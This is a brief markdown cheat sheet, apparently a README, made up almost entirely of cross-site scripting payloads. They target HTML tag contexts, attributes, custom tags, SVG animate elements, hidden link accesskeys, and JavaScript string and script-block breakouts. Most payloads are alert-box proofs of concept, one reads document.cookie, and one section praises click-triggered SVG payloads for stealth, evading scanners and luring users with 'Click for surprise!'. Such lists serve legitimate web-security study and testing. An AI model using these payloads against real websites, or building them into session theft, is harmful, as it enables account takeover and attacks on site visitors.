# xss-cheat-sheet

XSS between HTML tags


<script>alert(document.domain)</script>
 <img src=1 onerror=alert(1)>


XSS in HTML tag attributes

"><script>alert(document.domain)</script>

" autofocus onfocus=alert(document.domain) x="

<a href="javascript:alert(document.domain)">

Custom tag
<blog-tag onclick=alert(document.cookie)>
<customtag onmouseover=alert(1)>XSS</customtag>
<customtag autofocus onfocus=alert(1) tabindex=1></customtag>

"><svg><animatetransform onbegin=alert(1)>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>

<!-- clickable XSS -->
<svg><a><animate attributeName=href values=javascript:alert(1)></animate><text y=20 x=20>Click</text></a></svg>

<!-- auto triggered -->
<svg><animate attributeName=onload values=alert(1) begin=0s dur=1s></svg>

<!-- CSS injection -->
<svg><animate attributeName=style values="background:url(javascript:alert(1))" dur=1s></svg>


The Security Importance of Begin=click

1. Stealth: Malicious code remains hidden until the user clicks.
2. Bypass: Can bypass automatic security scans.
3. Social Engineering: Triggers the user with text like "Click me."
4. Timing Control: Triggered at the attacker's desired time.



real life example
<svg width="200" height="50">
  <a>
    <animate attributeName="href" 
             values="javascript:alert('XSS Executed!')" 
             begin="click" 
             dur="1s"/>
    <text x="10" y="30" fill="blue" style="cursor:pointer">
      Click for surprise! 🎁
    </text>
  </a>
</svg>


XSS in hidden input fields

Look at inside head tags
<link rel="canonical" accesskey="X" onclick="alert(1)" />
(Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)


XSS into JavaScript


Terminating the existing script
If there is such a things like that 

<script>
                        var searchTerms = '<script>alert(1)</script>';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>

You could use a payload down below
</script><script>alert(1)</script>



Breaking out of a JavaScript string


If there is something like that

 <script>
                        var searchTerms = 'test123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>

You can use these payloads 
‘-alert(1)-’
'+alert(1)+'
';alert(1);'
';alert(1)//'
'-alert(document.domain)-'
 ';alert(document.domain)//

